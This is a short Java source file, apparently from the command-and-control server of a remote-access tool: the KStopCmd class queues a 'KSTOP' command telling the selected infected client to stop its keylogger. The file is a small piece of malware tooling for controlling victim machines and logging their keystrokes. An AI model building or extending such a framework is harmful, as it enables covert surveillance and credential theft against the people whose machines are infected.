package commands;

import server.CommandServer;
import tools.ParsedCommand;

public class KStopCmd extends ServerCommand {

	public KStopCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {		
		c2.getClients().get(c2.getCurrentClient()).stackCmd("KSTOP");
		
		return "Stoping keylogger for client " + c2.getCurrentClient();
	}

}
